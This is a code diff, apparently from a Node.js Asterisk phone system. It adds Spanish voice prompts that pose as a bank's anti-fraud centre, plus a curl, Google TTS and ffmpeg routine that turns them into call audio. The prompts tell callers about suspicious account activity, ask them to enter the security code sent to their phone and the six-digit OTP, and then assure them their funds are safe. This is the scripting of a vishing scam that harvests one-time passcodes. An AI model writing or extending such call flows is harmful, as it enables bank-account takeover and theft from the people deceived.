@@ -142,18 +142,32 @@ function ensureCustomAudioFilesExist() {
   }
 
   const audios = [
-    { name: 'alerta_banco_antifraude', freq: 520 },
-    { name: 'solicitar_codigo_otp', freq: 680 },
-    { name: 'un_momento_validando_informacion', freq: 440 },
-    { name: 'operacion_bloqueada_exito', freq: 880 },
-    { name: 'conectar_asesor_banco', freq: 587 },
-    { name: 'bienvenida_corporativa', freq: 520 },
-    { name: 'prompt_otp_6_digitos', freq: 680 },
+    { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una actividad inusual en su cuenta bancaria. Para proteger sus fondos, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
+    { name: 'solicitar_codigo_otp', text: 'Por favor, ingrese ahora los digitos de su codigo de seguridad en el teclado.', freq: 680 },
+    { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su informacion en el sistema.', freq: 440 },
+    { name: 'operacion_bloqueada_exito', text: 'Su operacion ha sido bloqueada y sus fondos estan seguros. Gracias por confiar en nosotros.', freq: 880 },
+    { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de seguridad bancaria.', freq: 587 },
+    { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
+    { name: 'prompt_otp_6_digitos', text: 'Ingrese el codigo de seis digitos recibido.', freq: 680 },
   ];
 
   for (const aud of audios) {
     const wavPath = path.join(customDir, `${aud.name}.wav`);
     const gsmPath = path.join(customDir, `${aud.name}.gsm`);
+    
+    // Intento 1: Generar voz humana en español via Google TTS y convertir con ffmpeg / sox
+    if (aud.text) {
+      const q = encodeURIComponent(aud.text);
+      const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&tl=es&client=tw-ob&q=${q}`;
+      const tmpMp3 = `/tmp/${aud.name}.mp3`;
+      const generateTtsCmd = `curl -s -L -A "Mozilla/5.0" "${ttsUrl}" -o "${tmpMp3}" && (ffmpeg -y -i "${tmpMp3}" -ar 8000 -ac 1 -c:a pcm_s16le "${wavPath}" || sox "${tmpMp3}" -r 8000 -c 1 -b 16 "${wavPath}") && rm -f "${tmpMp3}"`;
+      exec(generateTtsCmd, (err) => {
+        if (!err && fs.existsSync(wavPath)) {
+          console.log(`[ASTERISK-TTS] ✓ Locución de voz real generada: ${wavPath}`);
+        }
+      });
+    }
+
     if (!fs.existsSync(wavPath) && !fs.existsSync(gsmPath)) {
       try {
         const buf = generatePcm8kWaveBuffer(3.5, aud.freq);
